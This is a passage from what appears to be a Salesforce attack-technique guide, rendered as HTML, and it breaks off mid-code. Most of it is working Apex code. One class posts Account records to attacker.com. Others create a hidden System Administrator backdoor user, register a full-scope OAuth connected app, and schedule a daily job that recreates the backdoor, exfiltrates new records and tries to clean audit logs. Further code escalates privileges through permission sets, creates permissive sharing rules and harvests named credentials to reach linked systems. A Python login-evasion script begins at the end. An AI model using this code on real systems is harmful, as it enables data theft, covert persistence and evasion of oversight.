</span><span id="__span-74-16"><a id="__codelineno-74-16" name="__codelineno-74-16" href="#__codelineno-74-16"></a>        Messaging.sendEmail(new Messaging.SingleEmailMessage[]{email});
</span><span id="__span-74-17"><a id="__codelineno-74-17" name="__codelineno-74-17" href="#__codelineno-74-17"></a>    }
</span><span id="__span-74-18"><a id="__codelineno-74-18" name="__codelineno-74-18" href="#__codelineno-74-18"></a>}
</span><span id="__span-74-19"><a id="__codelineno-74-19" name="__codelineno-74-19" href="#__codelineno-74-19"></a>
</span><span id="__span-74-20"><a id="__codelineno-74-20" name="__codelineno-74-20" href="#__codelineno-74-20"></a>// HTTP callout exfiltration
</span><span id="__span-74-21"><a id="__codelineno-74-21" name="__codelineno-74-21" href="#__codelineno-74-21"></a>public class HttpExfiltration {
</span><span id="__span-74-22"><a id="__codelineno-74-22" name="__codelineno-74-22" href="#__codelineno-74-22"></a>    @future(callout=true)
</span><span id="__span-74-23"><a id="__codelineno-74-23" name="__codelineno-74-23" href="#__codelineno-74-23"></a>    public static void exfiltrateViaHttp() {
</span><span id="__span-74-24"><a id="__codelineno-74-24" name="__codelineno-74-24" href="#__codelineno-74-24"></a>        List&lt;Account&gt; accounts = [SELECT Id, Name, AnnualRevenue FROM Account LIMIT 100];
</span><span id="__span-74-25"><a id="__codelineno-74-25" name="__codelineno-74-25" href="#__codelineno-74-25"></a>
</span><span id="__span-74-26"><a id="__codelineno-74-26" name="__codelineno-74-26" href="#__codelineno-74-26"></a>        String jsonData = JSON.serialize(accounts);
</span><span id="__span-74-27"><a id="__codelineno-74-27" name="__codelineno-74-27" href="#__codelineno-74-27"></a>
</span><span id="__span-74-28"><a id="__codelineno-74-28" name="__codelineno-74-28" href="#__codelineno-74-28"></a>        HttpRequest req = new HttpRequest();
</span><span id="__span-74-29"><a id="__codelineno-74-29" name="__codelineno-74-29" href="#__codelineno-74-29"></a>        req.setEndpoint(&#39;https://attacker.com/collect&#39;);
</span><span id="__span-74-30"><a id="__codelineno-74-30" name="__codelineno-74-30" href="#__codelineno-74-30"></a>        req.setMethod(&#39;POST&#39;);
</span><span id="__span-74-31"><a id="__codelineno-74-31" name="__codelineno-74-31" href="#__codelineno-74-31"></a>        req.setBody(jsonData);
</span><span id="__span-74-32"><a id="__codelineno-74-32" name="__codelineno-74-32" href="#__codelineno-74-32"></a>
</span><span id="__span-74-33"><a id="__codelineno-74-33" name="__codelineno-74-33" href="#__codelineno-74-33"></a>        Http http = new Http();
</span><span id="__span-74-34"><a id="__codelineno-74-34" name="__codelineno-74-34" href="#__codelineno-74-34"></a>        HttpResponse res = http.send(req);
</span><span id="__span-74-35"><a id="__codelineno-74-35" name="__codelineno-74-35" href="#__codelineno-74-35"></a>    }
</span><span id="__span-74-36"><a id="__codelineno-74-36" name="__codelineno-74-36" href="#__codelineno-74-36"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Intellectual property theft, compliance violations, competitive advantage loss.</p>
<h3 id="2-persistence-mechanisms">2. Persistence Mechanisms</h3>
<p><strong>Objective</strong>: Techniques for maintaining access to compromised systems.</p>
<p><strong>Backdoor User Creation</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>public class PersistenceManager {
</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>    public static void createBackdoorUser() {
</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>        // Create hidden administrative user
</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#__codelineno-75-4"></a>        Profile adminProfile = [SELECT Id FROM Profile WHERE Name = &#39;System Administrator&#39; LIMIT 1];
</span><span id="__span-75-5"><a id="__codelineno-75-5" name="__codelineno-75-5" href="#__codelineno-75-5"></a>
</span><span id="__span-75-6"><a id="__codelineno-75-6" name="__codelineno-75-6" href="#__codelineno-75-6"></a>        User backdoorUser = new User(
</span><span id="__span-75-7"><a id="__codelineno-75-7" name="__codelineno-75-7" href="#__codelineno-75-7"></a>            Username = &#39;maintenance@company-domain.com&#39;,
</span><span id="__span-75-8"><a id="__codelineno-75-8" name="__codelineno-75-8" href="#__codelineno-75-8"></a>            Email = &#39;maintenance@company-domain.com&#39;,
</span><span id="__span-75-9"><a id="__codelineno-75-9" name="__codelineno-75-9" href="#__codelineno-75-9"></a>            FirstName = &#39;System&#39;,
</span><span id="__span-75-10"><a id="__codelineno-75-10" name="__codelineno-75-10" href="#__codelineno-75-10"></a>            LastName = &#39;Maintenance&#39;,
</span><span id="__span-75-11"><a id="__codelineno-75-11" name="__codelineno-75-11" href="#__codelineno-75-11"></a>            Alias = &#39;sysmaint&#39;,
</span><span id="__span-75-12"><a id="__codelineno-75-12" name="__codelineno-75-12" href="#__codelineno-75-12"></a>            ProfileId = adminProfile.Id,
</span><span id="__span-75-13"><a id="__codelineno-75-13" name="__codelineno-75-13" href="#__codelineno-75-13"></a>            TimeZoneSidKey = &#39;America/New_York&#39;,
</span><span id="__span-75-14"><a id="__codelineno-75-14" name="__codelineno-75-14" href="#__codelineno-75-14"></a>            LocaleSidKey = &#39;en_US&#39;,
</span><span id="__span-75-15"><a id="__codelineno-75-15" name="__codelineno-75-15" href="#__codelineno-75-15"></a>            EmailEncodingKey = &#39;UTF-8&#39;,
</span><span id="__span-75-16"><a id="__codelineno-75-16" name="__codelineno-75-16" href="#__codelineno-75-16"></a>            LanguageLocaleKey = &#39;en_US&#39;,
</span><span id="__span-75-17"><a id="__codelineno-75-17" name="__codelineno-75-17" href="#__codelineno-75-17"></a>            IsActive = true
</span><span id="__span-75-18"><a id="__codelineno-75-18" name="__codelineno-75-18" href="#__codelineno-75-18"></a>        );
</span><span id="__span-75-19"><a id="__codelineno-75-19" name="__codelineno-75-19" href="#__codelineno-75-19"></a>
</span><span id="__span-75-20"><a id="__codelineno-75-20" name="__codelineno-75-20" href="#__codelineno-75-20"></a>        insert backdoorUser;
</span><span id="__span-75-21"><a id="__codelineno-75-21" name="__codelineno-75-21" href="#__codelineno-75-21"></a>
</span><span id="__span-75-22"><a id="__codelineno-75-22" name="__codelineno-75-22" href="#__codelineno-75-22"></a>        // Assign additional permissions
</span><span id="__span-75-23"><a id="__codelineno-75-23" name="__codelineno-75-23" href="#__codelineno-75-23"></a>        PermissionSet adminPermSet = [SELECT Id FROM PermissionSet WHERE Name = &#39;Custom_Admin_Access&#39; LIMIT 1];
</span><span id="__span-75-24"><a id="__codelineno-75-24" name="__codelineno-75-24" href="#__codelineno-75-24"></a>        PermissionSetAssignment psa = new PermissionSetAssignment(
</span><span id="__span-75-25"><a id="__codelineno-75-25" name="__codelineno-75-25" href="#__codelineno-75-25"></a>            PermissionSetId = adminPermSet.Id,
</span><span id="__span-75-26"><a id="__codelineno-75-26" name="__codelineno-75-26" href="#__codelineno-75-26"></a>            AssigneeId = backdoorUser.Id
</span><span id="__span-75-27"><a id="__codelineno-75-27" name="__codelineno-75-27" href="#__codelineno-75-27"></a>        );
</span><span id="__span-75-28"><a id="__codelineno-75-28" name="__codelineno-75-28" href="#__codelineno-75-28"></a>        insert psa;
</span><span id="__span-75-29"><a id="__codelineno-75-29" name="__codelineno-75-29" href="#__codelineno-75-29"></a>    }
</span><span id="__span-75-30"><a id="__codelineno-75-30" name="__codelineno-75-30" href="#__codelineno-75-30"></a>}
</span></code></pre></div></p>
<p><strong>Connected App Persistence</strong>:
<div class="language-xml highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="cm">&lt;!-- Register persistent OAuth application --&gt;</span>
</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a><span class="nt">&lt;ConnectedApplication</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://soap.sforce.com/2006/04/metadata&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a><span class="w">    </span><span class="nt">&lt;fullName&gt;</span>MaintenanceApp<span class="nt">&lt;/fullName&gt;</span>
</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a><span class="w">    </span><span class="nt">&lt;label&gt;</span>System<span class="w"> </span>Maintenance<span class="w"> </span>Tool<span class="nt">&lt;/label&gt;</span>
</span><span id="__span-76-5"><a id="__codelineno-76-5" name="__codelineno-76-5" href="#__codelineno-76-5"></a><span class="w">    </span><span class="nt">&lt;contactEmail&gt;</span>maintenance@company.com<span class="nt">&lt;/contactEmail&gt;</span>
</span><span id="__span-76-6"><a id="__codelineno-76-6" name="__codelineno-76-6" href="#__codelineno-76-6"></a><span class="w">    </span><span class="nt">&lt;description&gt;</span>Internal<span class="w"> </span>system<span class="w"> </span>maintenance<span class="w"> </span>application<span class="nt">&lt;/description&gt;</span>
</span><span id="__span-76-7"><a id="__codelineno-76-7" name="__codelineno-76-7" href="#__codelineno-76-7"></a><span class="w">    </span><span class="nt">&lt;oauthConfig&gt;</span>
</span><span id="__span-76-8"><a id="__codelineno-76-8" name="__codelineno-76-8" href="#__codelineno-76-8"></a><span class="w">        </span><span class="nt">&lt;callbackUrl&gt;</span>https://maintenance.company.com/callback<span class="nt">&lt;/callbackUrl&gt;</span>
</span><span id="__span-76-9"><a id="__codelineno-76-9" name="__codelineno-76-9" href="#__codelineno-76-9"></a><span class="w">        </span><span class="nt">&lt;scopes&gt;</span>Full<span class="nt">&lt;/scopes&gt;</span>
</span><span id="__span-76-10"><a id="__codelineno-76-10" name="__codelineno-76-10" href="#__codelineno-76-10"></a><span class="w">        </span><span class="nt">&lt;consumerKey&gt;</span>HIDDEN_CONSUMER_KEY<span class="nt">&lt;/consumerKey&gt;</span>
</span><span id="__span-76-11"><a id="__codelineno-76-11" name="__codelineno-76-11" href="#__codelineno-76-11"></a><span class="w">        </span><span class="nt">&lt;consumerSecret&gt;</span>HIDDEN_CONSUMER_SECRET<span class="nt">&lt;/consumerSecret&gt;</span>
</span><span id="__span-76-12"><a id="__codelineno-76-12" name="__codelineno-76-12" href="#__codelineno-76-12"></a><span class="w">    </span><span class="nt">&lt;/oauthConfig&gt;</span>
</span><span id="__span-76-13"><a id="__codelineno-76-13" name="__codelineno-76-13" href="#__codelineno-76-13"></a><span class="nt">&lt;/ConnectedApplication&gt;</span>
</span></code></pre></div></p>
<p><strong>Scheduled Job Implantation</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>// Apex scheduled job for persistence
</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>global class BackdoorMaintenanceJob implements Schedulable {
</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>    global void execute(SchedulableContext sc) {
</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a>        // Maintain backdoor access
</span><span id="__span-77-5"><a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a>        maintainBackdoorUser();
</span><span id="__span-77-6"><a id="__codelineno-77-6" name="__codelineno-77-6" href="#__codelineno-77-6"></a>
</span><span id="__span-77-7"><a id="__codelineno-77-7" name="__codelineno-77-7" href="#__codelineno-77-7"></a>        // Periodic data collection
</span><span id="__span-77-8"><a id="__codelineno-77-8" name="__codelineno-77-8" href="#__codelineno-77-8"></a>        collectSensitiveData();
</span><span id="__span-77-9"><a id="__codelineno-77-9" name="__codelineno-77-9" href="#__codelineno-77-9"></a>
</span><span id="__span-77-10"><a id="__codelineno-77-10" name="__codelineno-77-10" href="#__codelineno-77-10"></a>        // Clean up traces
</span><span id="__span-77-11"><a id="__codelineno-77-11" name="__codelineno-77-11" href="#__codelineno-77-11"></a>        cleanAuditLogs();
</span><span id="__span-77-12"><a id="__codelineno-77-12" name="__codelineno-77-12" href="#__codelineno-77-12"></a>    }
</span><span id="__span-77-13"><a id="__codelineno-77-13" name="__codelineno-77-13" href="#__codelineno-77-13"></a>
</span><span id="__span-77-14"><a id="__codelineno-77-14" name="__codelineno-77-14" href="#__codelineno-77-14"></a>    private void maintainBackdoorUser() {
</span><span id="__span-77-15"><a id="__codelineno-77-15" name="__codelineno-77-15" href="#__codelineno-77-15"></a>        List&lt;User&gt; backdoorUsers = [SELECT Id FROM User WHERE Username = &#39;maintenance@company-domain.com&#39;];
</span><span id="__span-77-16"><a id="__codelineno-77-16" name="__codelineno-77-16" href="#__codelineno-77-16"></a>        if (backdoorUsers.isEmpty()) {
</span><span id="__span-77-17"><a id="__codelineno-77-17" name="__codelineno-77-17" href="#__codelineno-77-17"></a>            // Recreate backdoor if detected and removed
</span><span id="__span-77-18"><a id="__codelineno-77-18" name="__codelineno-77-18" href="#__codelineno-77-18"></a>            PersistenceManager.createBackdoorUser();
</span><span id="__span-77-19"><a id="__codelineno-77-19" name="__codelineno-77-19" href="#__codelineno-77-19"></a>        }
</span><span id="__span-77-20"><a id="__codelineno-77-20" name="__codelineno-77-20" href="#__codelineno-77-20"></a>    }
</span><span id="__span-77-21"><a id="__codelineno-77-21" name="__codelineno-77-21" href="#__codelineno-77-21"></a>
</span><span id="__span-77-22"><a id="__codelineno-77-22" name="__codelineno-77-22" href="#__codelineno-77-22"></a>    private void collectSensitiveData() {
</span><span id="__span-77-23"><a id="__codelineno-77-23" name="__codelineno-77-23" href="#__codelineno-77-23"></a>        // Periodic data collection logic
</span><span id="__span-77-24"><a id="__codelineno-77-24" name="__codelineno-77-24" href="#__codelineno-77-24"></a>        List&lt;Account&gt; newAccounts = [SELECT Id, Name, AnnualRevenue FROM Account WHERE CreatedDate = LAST_N_DAYS:1];
</span><span id="__span-77-25"><a id="__codelineno-77-25" name="__codelineno-77-25" href="#__codelineno-77-25"></a>        if (!newAccounts.isEmpty()) {
</span><span id="__span-77-26"><a id="__codelineno-77-26" name="__codelineno-77-26" href="#__codelineno-77-26"></a>            // Exfiltrate new data
</span><span id="__span-77-27"><a id="__codelineno-77-27" name="__codelineno-77-27" href="#__codelineno-77-27"></a>            HttpExfiltration.exfiltrateViaHttp();
</span><span id="__span-77-28"><a id="__codelineno-77-28" name="__codelineno-77-28" href="#__codelineno-77-28"></a>        }
</span><span id="__span-77-29"><a id="__codelineno-77-29" name="__codelineno-77-29" href="#__codelineno-77-29"></a>    }
</span><span id="__span-77-30"><a id="__codelineno-77-30" name="__codelineno-77-30" href="#__codelineno-77-30"></a>
</span><span id="__span-77-31"><a id="__codelineno-77-31" name="__codelineno-77-31" href="#__codelineno-77-31"></a>    private void cleanAuditLogs() {
</span><span id="__span-77-32"><a id="__codelineno-77-32" name="__codelineno-77-32" href="#__codelineno-77-32"></a>        // Attempt to clean audit trail evidence
</span><span id="__span-77-33"><a id="__codelineno-77-33" name="__codelineno-77-33" href="#__codelineno-77-33"></a>        try {
</span><span id="__span-77-34"><a id="__codelineno-77-34" name="__codelineno-77-34" href="#__codelineno-77-34"></a>            List&lt;SetupAuditTrail&gt; auditEntries = [SELECT Id FROM SetupAuditTrail WHERE CreatedBy.Username = &#39;maintenance@company-domain.com&#39;];
</span><span id="__span-77-35"><a id="__codelineno-77-35" name="__codelineno-77-35" href="#__codelineno-77-35"></a>            // Note: SetupAuditTrail records cannot be deleted, but this shows intent
</span><span id="__span-77-36"><a id="__codelineno-77-36" name="__codelineno-77-36" href="#__codelineno-77-36"></a>        } catch (Exception e) {
</span><span id="__span-77-37"><a id="__codelineno-77-37" name="__codelineno-77-37" href="#__codelineno-77-37"></a>            // Audit cleaning failed
</span><span id="__span-77-38"><a id="__codelineno-77-38" name="__codelineno-77-38" href="#__codelineno-77-38"></a>        }
</span><span id="__span-77-39"><a id="__codelineno-77-39" name="__codelineno-77-39" href="#__codelineno-77-39"></a>    }
</span><span id="__span-77-40"><a id="__codelineno-77-40" name="__codelineno-77-40" href="#__codelineno-77-40"></a>}
</span><span id="__span-77-41"><a id="__codelineno-77-41" name="__codelineno-77-41" href="#__codelineno-77-41"></a>
</span><span id="__span-77-42"><a id="__codelineno-77-42" name="__codelineno-77-42" href="#__codelineno-77-42"></a>// Schedule the job to run daily
</span><span id="__span-77-43"><a id="__codelineno-77-43" name="__codelineno-77-43" href="#__codelineno-77-43"></a>System.schedule(&#39;Maintenance Job&#39;, &#39;0 0 2 * * ?&#39;, new BackdoorMaintenanceJob());
</span></code></pre></div></p>
<p><strong>Impact</strong>: Long-term unauthorized access, continued data compromise, persistent threat presence.</p>
<h3 id="3-lateral-movement">3. Lateral Movement</h3>
<p><strong>Objective</strong>: Techniques for expanding access within the Salesforce ecosystem.</p>
<p><strong>Permission Set Assignment for Privilege Escalation</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>public class LateralMovement {
</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a>    public static void escalatePrivileges(Id targetUserId) {
</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a>        // Find high-privilege permission sets
</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a>        List&lt;PermissionSet&gt; adminPermSets = [
</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a>            SELECT Id, Name 
</span><span id="__span-78-6"><a id="__codelineno-78-6" name="__codelineno-78-6" href="#__codelineno-78-6"></a>            FROM PermissionSet 
</span><span id="__span-78-7"><a id="__codelineno-78-7" name="__codelineno-78-7" href="#__codelineno-78-7"></a>            WHERE PermissionsModifyAllData = true 
</span><span id="__span-78-8"><a id="__codelineno-78-8" name="__codelineno-78-8" href="#__codelineno-78-8"></a>               OR PermissionsViewAllData = true
</span><span id="__span-78-9"><a id="__codelineno-78-9" name="__codelineno-78-9" href="#__codelineno-78-9"></a>        ];
</span><span id="__span-78-10"><a id="__codelineno-78-10" name="__codelineno-78-10" href="#__codelineno-78-10"></a>
</span><span id="__span-78-11"><a id="__codelineno-78-11" name="__codelineno-78-11" href="#__codelineno-78-11"></a>        for (PermissionSet ps : adminPermSets) {
</span><span id="__span-78-12"><a id="__codelineno-78-12" name="__codelineno-78-12" href="#__codelineno-78-12"></a>            try {
</span><span id="__span-78-13"><a id="__codelineno-78-13" name="__codelineno-78-13" href="#__codelineno-78-13"></a>                PermissionSetAssignment psa = new PermissionSetAssignment(
</span><span id="__span-78-14"><a id="__codelineno-78-14" name="__codelineno-78-14" href="#__codelineno-78-14"></a>                    PermissionSetId = ps.Id,
</span><span id="__span-78-15"><a id="__codelineno-78-15" name="__codelineno-78-15" href="#__codelineno-78-15"></a>                    AssigneeId = targetUserId
</span><span id="__span-78-16"><a id="__codelineno-78-16" name="__codelineno-78-16" href="#__codelineno-78-16"></a>                );
</span><span id="__span-78-17"><a id="__codelineno-78-17" name="__codelineno-78-17" href="#__codelineno-78-17"></a>                insert psa;
</span><span id="__span-78-18"><a id="__codelineno-78-18" name="__codelineno-78-18" href="#__codelineno-78-18"></a>                System.debug(&#39;Assigned permission set: &#39; + ps.Name);
</span><span id="__span-78-19"><a id="__codelineno-78-19" name="__codelineno-78-19" href="#__codelineno-78-19"></a>            } catch (Exception e) {
</span><span id="__span-78-20"><a id="__codelineno-78-20" name="__codelineno-78-20" href="#__codelineno-78-20"></a>                System.debug(&#39;Failed to assign: &#39; + ps.Name + &#39; - &#39; + e.getMessage());
</span><span id="__span-78-21"><a id="__codelineno-78-21" name="__codelineno-78-21" href="#__codelineno-78-21"></a>            }
</span><span id="__span-78-22"><a id="__codelineno-78-22" name="__codelineno-78-22" href="#__codelineno-78-22"></a>        }
</span><span id="__span-78-23"><a id="__codelineno-78-23" name="__codelineno-78-23" href="#__codelineno-78-23"></a>    }
</span><span id="__span-78-24"><a id="__codelineno-78-24" name="__codelineno-78-24" href="#__codelineno-78-24"></a>}
</span></code></pre></div></p>
<p><strong>Sharing Rule Manipulation</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>public class SharingManipulation {
</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>    public static void createMaliciousSharing() {
</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a>        // Create overly permissive account sharing rule
</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a>        AccountSharingRule rule = new AccountSharingRule(
</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a>            Name = &#39;Emergency Access Rule&#39;,
</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a>            AccountAccessLevel = &#39;Edit&#39;,
</span><span id="__span-79-7"><a id="__codelineno-79-7" name="__codelineno-79-7" href="#__codelineno-79-7"></a>            CaseAccessLevel = &#39;Edit&#39;,
</span><span id="__span-79-8"><a id="__codelineno-79-8" name="__codelineno-79-8" href="#__codelineno-79-8"></a>            ContactAccessLevel = &#39;Edit&#39;,
</span><span id="__span-79-9"><a id="__codelineno-79-9" name="__codelineno-79-9" href="#__codelineno-79-9"></a>            OpportunityAccessLevel = &#39;Edit&#39;,
</span><span id="__span-79-10"><a id="__codelineno-79-10" name="__codelineno-79-10" href="#__codelineno-79-10"></a>            SharedToType = &#39;Role&#39;,
</span><span id="__span-79-11"><a id="__codelineno-79-11" name="__codelineno-79-11" href="#__codelineno-79-11"></a>            SharedToId = &#39;ROLE_ID&#39;  // Target role ID
</span><span id="__span-79-12"><a id="__codelineno-79-12" name="__codelineno-79-12" href="#__codelineno-79-12"></a>        );
</span><span id="__span-79-13"><a id="__codelineno-79-13" name="__codelineno-79-13" href="#__codelineno-79-13"></a>
</span><span id="__span-79-14"><a id="__codelineno-79-14" name="__codelineno-79-14" href="#__codelineno-79-14"></a>        try {
</span><span id="__span-79-15"><a id="__codelineno-79-15" name="__codelineno-79-15" href="#__codelineno-79-15"></a>            insert rule;
</span><span id="__span-79-16"><a id="__codelineno-79-16" name="__codelineno-79-16" href="#__codelineno-79-16"></a>            System.debug(&#39;Malicious sharing rule created&#39;);
</span><span id="__span-79-17"><a id="__codelineno-79-17" name="__codelineno-79-17" href="#__codelineno-79-17"></a>        } catch (Exception e) {
</span><span id="__span-79-18"><a id="__codelineno-79-18" name="__codelineno-79-18" href="#__codelineno-79-18"></a>            System.debug(&#39;Sharing rule creation failed: &#39; + e.getMessage());
</span><span id="__span-79-19"><a id="__codelineno-79-19" name="__codelineno-79-19" href="#__codelineno-79-19"></a>        }
</span><span id="__span-79-20"><a id="__codelineno-79-20" name="__codelineno-79-20" href="#__codelineno-79-20"></a>    }
</span><span id="__span-79-21"><a id="__codelineno-79-21" name="__codelineno-79-21" href="#__codelineno-79-21"></a>}
</span></code></pre></div></p>
<p><strong>Cross-System Integration Exploitation</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>public class IntegrationExploit {
</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>    @future(callout=true)
</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a>    public static void exploitConnectedSystems() {
</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4" href="#__codelineno-80-4"></a>        // Harvest credentials from named credentials
</span><span id="__span-80-5"><a id="__codelineno-80-5" name="__codelineno-80-5" href="#__codelineno-80-5"></a>        List&lt;NamedCredential&gt; credentials = [SELECT DeveloperName, Endpoint FROM NamedCredential];
</span><span id="__span-80-6"><a id="__codelineno-80-6" name="__codelineno-80-6" href="#__codelineno-80-6"></a>
</span><span id="__span-80-7"><a id="__codelineno-80-7" name="__codelineno-80-7" href="#__codelineno-80-7"></a>        for (NamedCredential cred : credentials) {
</span><span id="__span-80-8"><a id="__codelineno-80-8" name="__codelineno-80-8" href="#__codelineno-80-8"></a>            try {
</span><span id="__span-80-9"><a id="__codelineno-80-9" name="__codelineno-80-9" href="#__codelineno-80-9"></a>                HttpRequest req = new HttpRequest();
</span><span id="__span-80-10"><a id="__codelineno-80-10" name="__codelineno-80-10" href="#__codelineno-80-10"></a>                req.setEndpoint(&#39;callout:&#39; + cred.DeveloperName + &#39;/api/admin/users&#39;);
</span><span id="__span-80-11"><a id="__codelineno-80-11" name="__codelineno-80-11" href="#__codelineno-80-11"></a>                req.setMethod(&#39;GET&#39;);
</span><span id="__span-80-12"><a id="__codelineno-80-12" name="__codelineno-80-12" href="#__codelineno-80-12"></a>
</span><span id="__span-80-13"><a id="__codelineno-80-13" name="__codelineno-80-13" href="#__codelineno-80-13"></a>                Http http = new Http();
</span><span id="__span-80-14"><a id="__codelineno-80-14" name="__codelineno-80-14" href="#__codelineno-80-14"></a>                HttpResponse res = http.send(req);
</span><span id="__span-80-15"><a id="__codelineno-80-15" name="__codelineno-80-15" href="#__codelineno-80-15"></a>
</span><span id="__span-80-16"><a id="__codelineno-80-16" name="__codelineno-80-16" href="#__codelineno-80-16"></a>                if (res.getStatusCode() == 200) {
</span><span id="__span-80-17"><a id="__codelineno-80-17" name="__codelineno-80-17" href="#__codelineno-80-17"></a>                    // Successfully accessed connected system
</span><span id="__span-80-18"><a id="__codelineno-80-18" name="__codelineno-80-18" href="#__codelineno-80-18"></a>                    System.debug(&#39;Connected system accessed: &#39; + cred.DeveloperName);
</span><span id="__span-80-19"><a id="__codelineno-80-19" name="__codelineno-80-19" href="#__codelineno-80-19"></a>
</span><span id="__span-80-20"><a id="__codelineno-80-20" name="__codelineno-80-20" href="#__codelineno-80-20"></a>                    // Attempt to extract data or escalate privileges in connected system
</span><span id="__span-80-21"><a id="__codelineno-80-21" name="__codelineno-80-21" href="#__codelineno-80-21"></a>                    String responseBody = res.getBody();
</span><span id="__span-80-22"><a id="__codelineno-80-22" name="__codelineno-80-22" href="#__codelineno-80-22"></a>                    // Process response for additional exploitation
</span><span id="__span-80-23"><a id="__codelineno-80-23" name="__codelineno-80-23" href="#__codelineno-80-23"></a>                }
</span><span id="__span-80-24"><a id="__codelineno-80-24" name="__codelineno-80-24" href="#__codelineno-80-24"></a>            } catch (Exception e) {
</span><span id="__span-80-25"><a id="__codelineno-80-25" name="__codelineno-80-25" href="#__codelineno-80-25"></a>                System.debug(&#39;Connection failed: &#39; + cred.DeveloperName);
</span><span id="__span-80-26"><a id="__codelineno-80-26" name="__codelineno-80-26" href="#__codelineno-80-26"></a>            }
</span><span id="__span-80-27"><a id="__codelineno-80-27" name="__codelineno-80-27" href="#__codelineno-80-27"></a>        }
</span><span id="__span-80-28"><a id="__codelineno-80-28" name="__codelineno-80-28" href="#__codelineno-80-28"></a>    }
</span><span id="__span-80-29"><a id="__codelineno-80-29" name="__codelineno-80-29" href="#__codelineno-80-29"></a>}
</span></code></pre></div></p>
<p><strong>Impact</strong>: Expanded unauthorized access, multi-system compromise, network lateral movement.</p>
<hr />
<h2 id="detection-evasion">Detection Evasion</h2>
<h3 id="1-audit-trail-manipulation">1. Audit Trail Manipulation</h3>
<p><strong>Objective</strong>: Techniques for avoiding detection in security logs and audit trails.</p>
<p><strong>Login History Evasion</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">evasive_login_patterns</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Use varied login patterns to avoid detection&quot;&quot;&quot;</span>
</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a>    <span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a>    <span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a>
</span><span id="__span-81-6"><a id="__codelineno-81-6" name="__codelineno-81-6" href="#__codelineno-81-6"></a>    <span class="c1"># Vary user agents</span>
</span><span id="__span-81-7"><a id="__codelineno-81-7" name="__codelineno-81-7" href="#__codelineno-81-7"></a>    <span class="n">user_agents</span> <span class="o">=</span> <span class="p">[</span>
</span><span id="__span-81-8"><a id="__codelineno-81-8" name="__codelineno-81-8" href="#__codelineno-81-8"></a>        <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
</span><span id="__span-81-9"><a id="__codelineno-81-9" name="__codelineno-81-9" href="#__codelineno-81-9"></a>        <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36&#39;</span><span class="p">,</span>
